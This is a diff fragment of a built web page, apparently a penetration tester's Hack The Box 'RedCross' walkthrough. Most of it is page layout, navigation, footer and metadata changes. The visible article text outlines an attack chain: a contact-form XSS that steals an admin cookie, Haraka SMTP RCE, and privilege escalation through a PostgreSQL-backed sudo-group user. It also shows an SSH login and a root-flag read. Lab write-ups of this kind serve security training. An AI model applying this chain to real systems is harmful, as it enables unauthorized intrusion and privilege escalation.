 ssh r00t@10.129.11.228
 # password: REDACTED
 
@@ -319,7 +320,7 @@ cat /root/root.txt
 <p>Being blocked from setting <code>uid=0</code> felt like a dead end. But <code>gid=27</code> (sudo group) is equally powerful on a default Debian system. think about group memberships, not just user IDs.</p>
 <hr>
 <h2 id="attack-chain-summary">Attack Chain Summary</h2>
-<pre><code>nmap → SSL cert (penelope) → intra.redcross.htb
+<pre tabindex="0" aria-label="Code or terminal block 29"><code>nmap → SSL cert (penelope) → intra.redcross.htb
     → contact form XSS (cback field, unfiltered)
         → admin cookie stolen
             → admin.redcross.htb access
@@ -376,9 +377,9 @@ cat /root/root.txt
 <td>0xdf</td>
 <td>Injected via psql</td>
 </tr>
-</tbody></table>b:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$11"}}]
-c:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-ready-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Ready Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T11:56:59.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-retired-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Retired Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T11:46:58.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
-d:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L12",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
-13:T582,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-redcross-walkthrough/#article","headline":"Hack The Box: RedCross Walkthrough","description":"Stored XSS stole an administrator session, which opened hidden services and a jailed account; Haraka attachment RCE then landed as Penelope, and writable PostgreSQL-backed NSS records created a sudo-group user for root.","url":"https://cyberkareem.com/writing/hackthebox-redcross-walkthrough/","datePublished":"2026-06-11T11:49:40.000Z","dateModified":"2026-06-11T11:49:40.000Z","wordCount":2180,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/00a1686ad8de3dd442462fe01ba75e15f2964db2/HTB-RedCross.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-redcross-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-redcross-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: RedCross Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-redcross-walkthrough/"}]}]}e:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$13"}}]
-f:["$","$L14",null,{"children":["$","$15",null,{"name":"Next.MetadataOutlet","children":"$@16"}]}]
-16:null
+</tbody></table>c:["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","data-motion":"fade","children":[["$","$L11",null,{"headings":[{"id":"1-reconnaissance","label":"1. Reconnaissance"},{"id":"2-web-enumeration","label":"2. Web Enumeration"},{"id":"3-xss-via-contact-form","label":"3. XSS via Contact Form"},{"id":"4-admin-panel-access","label":"4. Admin Panel Access"},{"id":"5-firewall-whitelist-opening-new-ports","label":"5. Firewall Whitelist: Opening New Ports"},{"id":"6-ssh-jail-virtual-user-creation","label":"6. SSH Jail: Virtual User Creation"},{"id":"7-haraka-smtp-rce-shell-as-penelope","label":"7. Haraka SMTP RCE: Shell as Penelope"},{"id":"8-user-flag","label":"8. User Flag"},{"id":"9-privilege-escalation-via-postgresql","label":"9. Privilege Escalation via PostgreSQL"},{"id":"10-root-flag","label":"10. Root Flag"},{"id":"11-key-lessons","label":"11. Key lessons"},{"id":"attack-chain-summary","label":"Attack Chain Summary"},{"id":"credentials-reference","label":"Credentials Reference"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/00a1686ad8de3dd442462fe01ba75e15f2964db2/HTB-RedCross.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 00a1686ad8de",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["RedCross, Linux, Hard",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/redcross","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"5 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}],["$","div","source-context-2",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source attribution boundary"}],["$","p",null,{"children":"The source note refers to community material without a complete citation trail. This article keeps that context and does not claim independent reproduction of every documented path."}],null]}]]]}],["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$12"}}]]}]
+d:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-ready-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Ready Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T11:56:59.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-retired-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Retired Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T11:46:58.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
+e:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L13",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
+14:T582,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-redcross-walkthrough/#article","headline":"Hack The Box: RedCross Walkthrough","description":"Stored XSS stole an administrator session, which opened hidden services and a jailed account; Haraka attachment RCE then landed as Penelope, and writable PostgreSQL-backed NSS records created a sudo-group user for root.","url":"https://cyberkareem.com/writing/hackthebox-redcross-walkthrough/","datePublished":"2026-06-11T11:49:40.000Z","dateModified":"2026-06-11T11:49:40.000Z","wordCount":2180,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/00a1686ad8de3dd442462fe01ba75e15f2964db2/HTB-RedCross.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-redcross-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-redcross-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: RedCross Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-redcross-walkthrough/"}]}]}f:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$14"}}]
+10:["$","$L15",null,{"children":["$","$16",null,{"name":"Next.MetadataOutlet","children":"$@17"}]}]
+17:null
